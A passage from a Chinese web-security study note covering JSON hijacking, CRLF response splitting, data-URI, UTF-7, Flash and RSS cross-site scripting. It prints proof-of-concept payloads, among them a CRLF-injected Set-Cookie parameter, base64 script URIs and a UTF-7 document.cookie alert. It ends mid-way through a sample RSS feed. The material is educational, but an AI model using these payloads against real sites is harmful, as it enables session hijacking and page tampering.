<span class="line"><span>var user={&quot;name&quot;:&quot;&lt;img src=javascript:alert(xss)&gt;&quot;}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>通过ajax技术处理json数据的方式称为”回调法“；json数据文件加载完后都会调用一个特别的函数，并以json数据作为参数；</p><p>某些服务能让用户指定调用函数的名字；用户可以通过url改变函数名；</p><p>例如要访问id为10的profile,只需发送</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>http://xxxx.com/Getprofile.html?callback=profileCallback&amp;id=10</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><strong>json hijacking</strong></p><p>该漏洞允许未经授权的攻击者从一个易受攻击的应用程序中读取数据；</p><p>通过该漏洞，攻击者可以绕过web浏览器中使用的同源策略；窃取数据；</p><p>流程：用户在保存信任站点的cookie访问恶意站点，浏览器向信任站点发出请求，信任站点识别cookie返回json数据到恶意站点；</p><h3 id="_2-14-3-http-response-splitting" tabindex="-1"><a class="header-anchor" href="#_2-14-3-http-response-splitting"><span>2.14.3 HTTP Response Splitting</span></a></h3><p>HTTP响应拆分也被称为crlf注射攻击，用户能随意添加额外的http报头信息到http数据包中，然后通过自定义http头创造任意的内容返回用户浏览器中；</p><p><strong>HTTP Header</strong></p><p>随便抓个包来看一下；</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>请求包</span></span>
<span class="line"><span>GET / HTTP/1.1</span></span>
<span class="line"><span>Host: uu2fu3o.com</span></span>
<span class="line"><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span></span>
<span class="line"><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span>
<span class="line"><span>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
<span class="line"><span>Accept-Encoding: gzip, deflate</span></span>
<span class="line"><span>Connection: close</span></span>
<span class="line"><span>Upgrade-Insecure-Requests: 1</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>响应包</span></span>
<span class="line"><span>HTTP/1.1 200 OK</span></span>
<span class="line"><span>Server: nginx</span></span>
<span class="line"><span>Date: Wed, 05 Apr 2023 12:55:47 GMT</span></span>
<span class="line"><span>Content-Type: text/html; charset=UTF-8</span></span>
<span class="line"><span>Connection: close</span></span>
<span class="line"><span>Vary: Accept-Encoding</span></span>
<span class="line"><span>Content-Length: 29383</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>CRLF injection原理</strong></p><p>已知httpheader每一行由\r\n或者&quot;CR&quot;(回车) , &quot;LF&quot;(换行)分割,当用户提交包含&quot;\r\n&quot;的数据时，如果没有进行过滤而这届返回给http header，攻击者就能设置任意的http头，或者直接修改http response的内容；</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>假设有如下代码</span></span>
<span class="line"><span>&lt;%</span></span>
<span class="line"><span>nameValueCollection request =Request.QueryString;</span></span>
<span class="line"><span>Response.Cookies[&quot;username&quot;].Value = request[&quot;text&quot;];</span></span>
<span class="line"><span>%&gt;</span></span>
<span class="line"><span>该代码通过请求test来设置cookie值；</span></span>
<span class="line"><span>正常情况下访问http://xxx.com/demo.aspx?text=xxx</span></span>
<span class="line"><span>响应头应为</span></span>
<span class="line"><span>Set-Cookie: username=xxx</span></span>
<span class="line"><span>假设没有进行过滤，传递?text=xxx%0D%0ASet-Cookie%3A%20Hackercookie=hacker</span></span>
<span class="line"><span>就会得到</span></span>
<span class="line"><span>Set-Cookie: username=xxx</span></span>
<span class="line"><span>Set-Cookie: Hackercookie=hacker</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>不仅是添加cookie,还能够插入html/javascript代码并执行；</p><h3 id="_2-14-4-mhtml协议安全" tabindex="-1"><a class="header-anchor" href="#_2-14-4-mhtml协议安全"><span>2.14.4 MHTML协议安全</span></a></h3><p><a href="https://github.com/80vul/webzine/blob/master/webzine_0x05/0x05%20IE%25CF%25C2MHTML%D0%AD%25D2%25E9%25B4%25F8%25C0%25B4%25B5%C4%BF%25E7%25D3%25F2%CE%A3%25BA%25A6.html" target="_blank" rel="noopener noreferrer">参考</a></p><h3 id="_2-14-5-利用data-uris进行xss" tabindex="-1"><a class="header-anchor" href="#_2-14-5-利用data-uris进行xss"><span>2.14.5 利用Data URIs进行xss</span></a></h3><p>URL是URI常用协议的一个子集，URI用于指定一个协议用来接收信息，如果额外信息是一个地址，那么URI就等同于URL；</p><p>Data uri则是由RFC 2397定义的一种把小文件嵌入文档的方案</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>格式：data:[&lt;mime type&gt;][;charset=&lt;charset&gt;][;base64],&lt;encoded data&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>![data uri](data uri.png)</p><p>Data可以让用户把文件嵌入其他文件中</p><p><strong>Data uris xss</strong></p><p>data uri提供了一个在HTML或者CSS文件中嵌入图片的方法，但没有严格指定类型，我们可以在base64后嵌入任何类型的文件，甚至是html代码；</p><div class="language-html line-numbers-mode" data-highlighter="shiki" data-ext="html" data-title="html" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">a</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> href</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;test&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">a</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    base64编码内容为&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">alert</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;xss&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">可使用object标签，不需要用户点击即可弹窗</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">object</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> data</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4=&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">object</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_2-14-6-utf-7-bom-xss" tabindex="-1"><a class="header-anchor" href="#_2-14-6-utf-7-bom-xss"><span>2.14.6 UTF-7 BOM XSS</span></a></h3><figure><img src="/articles/assets/utf-7-Ba2evFeu.png" alt="utf-7" tabindex="0" loading="lazy"><figcaption>utf-7</figcaption></figure><p>如果字符集编码没有在HTTP的content-type头或html中的<meta>标签中定义，某些浏览器会自动猜测字符集编码；</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-</span></span>
<span class="line"><span>上述为&lt;script&gt;alert(document.cookie)&lt;/script&gt;转换为utf-7编码；</span></span>
<span class="line"><span>向浏览器发送一个get请求</span></span>
<span class="line"><span>http://server/+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-</span></span>
<span class="line"><span>//某些浏览器(</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_2-14-7-浏览器插件安全" tabindex="-1"><a class="header-anchor" href="#_2-14-7-浏览器插件安全"><span>2.14.7 浏览器插件安全</span></a></h3><p><strong>flash后门</strong></p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span> .\mtasc.exe -swf test.swf -main -header 1:1:1 test.as</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>class test {</span></span>
<span class="line"><span>function test(){</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span>static function main(mc){</span></span>
<span class="line"><span>getURL(&quot;javascript:alert(&#39;xss&#39;)&quot;);</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span>编写如下as文件，再使用mtasc编译，用户可以把swf文件上传到任意网站并且使用&lt;object&gt;&lt;embed&gt;对其进行调用来执行弹窗</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="/articles/assets/flash-CktBHt8m.png" alt="flash" tabindex="0" loading="lazy"><figcaption>flash</figcaption></figure><p><strong>来自pdf的xss</strong></p><p>pdf文档之所以不安全，是因为其本身支持javascript脚本语言的特性；</p><p>可通过较早版本的adobe reader进行xss代码的注入；这里不再多提</p><figure><img src="/articles/assets/pdfxss-CUVKrhBy.png" alt="pdfxss" tabindex="0" loading="lazy"><figcaption>pdfxss</figcaption></figure><p>该漏洞只影响7.0及以下版本；</p><p><strong>quick time xss</strong></p><p>该漏洞利用QuickTime播放器的不安全特色Text Tracks</p><h3 id="_2-14-8-特殊xss应用场景" tabindex="-1"><a class="header-anchor" href="#_2-14-8-特殊xss应用场景"><span>2.14.8 特殊XSS应用场景</span></a></h3><p><strong>基于cookie的xss</strong></p><p>该漏洞由于对cookie中的参数过滤不言，导致攻击者能够在cookie中插入跨站代码；</p><p><strong>来自RSS的XSS</strong></p><p>如何执行此类攻击，只需要修改XML文件中的RSS数据，在一些字段中加入恶意代码即可;</p><div class="language-xml line-numbers-mode" data-highlighter="shiki" data-ext="xml" data-title="xml" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;?</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">xml</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> version</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;1.0&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> encoding</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;UTF-8&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">?&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">rss</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> version</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;2.0&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> xmlns:atom</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;http://www.w3.org/2005/Atom&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> xmlns:cc</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;http://web.resource.org/cc/&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> xmlns:itunes</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;http://www.itunes.com/dtds/podcast-1.0.dtd&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> xmlns:media</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;http://search.yahoo.com/mrss/&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> xmlns:rdf</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;http://www.w3.org/1999/02/22-rdf-syntax-ns#&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">  &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">channel</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">atom:link</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> href</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;http://dataskeptic.libsyn.com/rss&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> rel</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;self&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> type</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;application/rss+xml&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">/&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">title</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;Data Skeptic&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">title</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">pubDate</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;Fri, 15 Jan 2016 15:00:00 +0000&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">pubDate</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">lastBuildDate</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;Fri, 15 Jan 2016 15:08:58 +0000&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">lastBuildDate</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">generator</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;Libsyn WebEngine 2.0&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">generator</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">link</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;http://dataskeptic.com&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">link</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">language</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;en&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">language</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">copyright</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&lt;![CDATA[Creative Commons Attribution License 3.0]]&gt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">copyright</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">docs</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;http://dataskeptic.com&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">docs</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">managingEditor</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;kylepolich@gmail.com (kylepolich@gmail.com)&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">managingEditor</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:summary</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&lt;![CDATA[The Data Skeptic Podcast features interviews and discussion of topics related to data science, statistics, machine learning, artificial intelligence and the like, all from the perspective of applying critical thinking and the scientific method to evaluate the veracity of claims and efficacy of approaches.]]&gt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:summary</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">image</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">      &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">url</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;http://static.libsyn.com/p/assets/2/9/3/8/2938570bb173ccbc/DataSkeptic-Podcast-1A.jpg&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">url</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">      &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">title</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;Data Skeptic&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">title</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">      &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">link</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&lt;![CDATA[http://dataskeptic.com]]&gt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">link</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">image</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:author</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;Kyle Polich&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:author</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:keywords</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;datamining,datascience,machinelearning,science,skepticism,statistics&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:keywords</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">  &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:category</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> text</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;Science </span><span style="--shiki-light:#50A14F;--shiki-dark:#D19A66;">&amp;</span><span style="--shiki-light:#986801;--shiki-dark:#E06C75;">amp</span><span style="--shiki-light:#50A14F;--shiki-dark:#D19A66;">;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Medicine&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">/&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">  &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:category</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> text</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;Technology&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">/&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">  &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:category</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> text</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;Education&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:category</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> text</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;Higher Education&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">/&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">  &lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:category</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:image</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> href</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;http://static.libsyn.com/p/assets/2/9/3/8/2938570bb173ccbc/DataSkeptic-Podcast-1A.jpg&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> /&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:explicit</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;clean&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:explicit</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:owner</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
